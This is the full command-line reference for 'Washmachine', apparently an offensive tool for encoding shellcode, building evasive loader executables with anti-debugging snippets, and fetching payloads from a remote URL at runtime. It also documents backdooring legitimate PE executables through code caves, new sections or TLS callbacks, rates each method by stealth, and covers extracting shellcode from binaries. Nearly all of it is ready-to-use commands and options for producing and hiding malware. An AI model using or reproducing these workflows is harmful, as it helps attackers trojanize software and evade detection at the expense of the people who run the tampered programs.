CLI Reference

The Washmachine CLI provides a comprehensive set of commands for encoding shellcode, building loaders, analyzing PE files, backdooring executables, and extracting shellcode from PE binaries.

Tip: Run washmachine-cli help --all for a full scrollable reference of every command and option directly in your terminal.

Usage

washmachine-cli <command> [options]

Commands

encode

Encode shellcode via Bin2Shell and build a loader executable from a template. Requires exactly one shellcode source.

Shellcode Source (one required)

Option Description
-s, --shellcode <file> Path to shellcode file (.bin)
--shellcode-hex <hex> Raw hex string (e.g. \xfc\x48\x83...)
-u, --shellcode-url <url> URL for web delivery mode — fetches payload at runtime

Options

Option Default Description
-t, --template <id> shellcode-minimal Template ID from the YAML catalog
-e, --encoder <index> 0 Encoder index (0=none, 1=XOR, 2=RC4, etc.)
-v, --envelope <index> 0 Envelope index (0=none, 1=Base64, 2=Base32, etc.)
--snippet <section=id> Attach a snippet to a template section (repeatable)
--verbose Show detailed compilation output
--json Output result as JSON

Examples

# Encode from a .bin shellcode file using the minimal template
washmachine-cli encode -s payload.bin -t shellcode-minimal

# Encode with XOR encoding and Base64 envelope, output as JSON
washmachine-cli encode -s payload.bin -e 1 -v 1 --json

# Encode from hex string with a snippet attached
washmachine-cli encode --shellcode-hex "\xfc\x48\x83..." --snippet anti_debugging=check_debugger

# Encode with web delivery URL and verbose output
washmachine-cli encode -u http://host/payload.bin -e 2 --verbose

# Stack multiple snippets on the default template
washmachine-cli encode -s payload.bin -t default --snippet guardrails=domain_check --snippet anti_debugging=check_debugger

analyze

Analyze a PE file — prints headers, sections, imports, and discovered code caves.

Arguments & Options

Option Description
<pe-file> Path to PE file to analyze (required)
--json Output result as JSON

Examples

# Analyze a PE file
washmachine-cli analyze target.exe

# Analyze with JSON output for scripting
washmachine-cli analyze target.exe --json

backdoor

Inject shellcode into an existing PE file using one of five injection methods.

Required Options

Option Description
--pe <file> Path to target PE file
-s, --shellcode <file> Path to shellcode file (.bin)

Options

Option Default Description
-o, --output <file> <input>.backdoored.exe Output path for the patched PE
-m, --method <method> code-cave Injection method (see table below)
--section-name <name> .extra Name for the new section (new-section method)
--carrier <invoke> entry-point How shellcode is invoked at runtime
--no-remove-sig Keep the Authenticode signature (if present)
--no-patch-subsystem Do not patch the PE subsystem field
--no-patch-exit Do not patch the exit behavior
--cave-min-size <n> Minimum code cave size in bytes (code-cave method)
--dry-run Simulate the injection without writing output
--verbose Show detailed injection output
--json Output result as JSON

Injection Methods

Method How It Works Stealth Size Limit Arch
code-cave Finds null-byte gaps in existing sections High — no structural changes Limited by cave size x86 / x64
new-section Adds a new PE section for the payload Low — new entry in section table Unlimited x86 / x64
section-ext Extends the last PE section Medium — no new header, but last section grows Unlimited x86 / x64
text-pad Writes into .text VirtualSize↔RawSize padding gap High — no structural changes, no file size change Limited by padding gap x86 / x64
tls-callback Creates a TLS callback that runs before main Medium — adds TLS directory entry Unlimited x64 only

Examples

# Inject using the default code-cave method
washmachine-cli backdoor --pe target.exe -s payload.bin

# Inject via new section with a custom section name
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section --section-name .data2

# Inject via TLS callback (x64 only)
washmachine-cli backdoor --pe target.exe -s payload.bin -m tls-callback -o backdoored.exe

# Extend the last section
washmachine-cli backdoor --pe target.exe -s payload.bin -m section-ext

# Use text padding (no file size change)
washmachine-cli backdoor --pe target.exe -s payload.bin -m text-pad

# Dry run — simulate without writing output
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section --dry-run --verbose

# Keep Authenticode signature and output as JSON
washmachine-cli backdoor --pe signed.exe -s payload.bin --no-remove-sig --json

strip

Extract flat binary (.bin) shellcode from a PE file.

Arguments & Options

Option Default Description
<pe-file> Path to PE file to strip (required)
-o, --output <file> <input>.bin Output path for the extracted binary
-m, --mode <mode> ep Extraction mode (see table below)
--section <name> Section name to extract (section mode)
--range <start:len> Byte range to extract (range mode)
--no-trim Do not trim trailing null bytes from output
--analyze Print PE analysis before stripping

Extraction Modes

Mode Description
ep Extract from the entry point section (default)
section Extract a specific section by name (requires --section)
all-exec Extract all executable sections concatenated
range Extract a raw byte range (requires --range)

Examples

# Extract from entry point section (default)
washmachine-cli strip loader.exe

# Extract a specific section
washmachine-cli strip loader.exe -m section --section .text -o shellcode.bin

# Extract all executable sections
washmachine-cli strip loader.exe -m all-exec

# Extract a raw byte range
washmachine-cli strip loader.exe -m range --range 0x400:512

# Analyze the PE before stripping, keep trailing nulls
washmachine-cli strip loader.exe --analyze --no-trim

list

List available templates, encoders, snippets, or compilers.

Options

Option Description
--templates List available templates from the YAML catalog
--encoders List available encoders from Bin2Shell
--snippets List available code snippets by section
--compilers List discovered C++ compilers on the system

Examples

# List discovered compilers
washmachine-cli list --compilers

# List available templates
washmachine-cli list --templates

# List available encoders
washmachine-cli list --encoders

# List available snippets
washmachine-cli list --snippets

provision

Download and install required external tools (Bin2Shell).

Examples

# Download Bin2Shell (run once before using encoding features)
washmachine-cli provision

test

Run the automated test harness.

Options

Option Description
--shellcode Path to shellcode file for testing
--phase Test phase to run (1, 2, 3, or all)
--url URL for web delivery testing
--test-assets Path to test assets directory

Test Phases

Phase Description
1 All encoder × envelope × web-helper combinations
2 All template × snippet permutations with default encoding
3 Multiple shellcode inputs from test assets directory
all Run all phases sequentially

Examples

# Run the automated test harness (all phases)
washmachine-cli test --shellcode messagebox.bin --phase all

# Run only Phase 1 (encoding combinations)
washmachine-cli test --shellcode messagebox.bin --phase 1

# Run Phase 1 with web delivery
washmachine-cli test --shellcode messagebox.bin --phase 1 --url http://host/payload.bin

# Run only Phase 3 (multiple shellcode inputs from test assets)
washmachine-cli test --phase 3 --test-assets "testing assets\binary\shellcodes"

Output Locations

Compilation Output

Compiled executables are saved to:

temp/cpp/Compiled BInaries/

Session Logs

Each compilation session saves artifacts to:

logging/session_<timestamp>_<uuid>/
├── source.cpp       # Generated C++ source
└── build_log.txt    # Compiler output

Test Results

Test harness results are written to:

test_results.json

JSON Output Format

When using the --json flag, commands output structured JSON for easy parsing:

Encode Command

{
  "success": true,
  "message": "Compilation successful",
  "outputPath": "temp/cpp/Compiled BInaries/loader.exe",
  "template": "shellcode-minimal",
  "encoder": "XOR"
}

Analyze Command

{
  "success": true,
  "peFile": "target.exe",
  "headers": { ... },
  "sections": [ ... ],
  "imports": [ ... ],
  "codeCaves": [ ... ]
}

Exit Codes

Code Meaning
0 Success
1 General error
2 Invalid arguments
3 Compilation failed
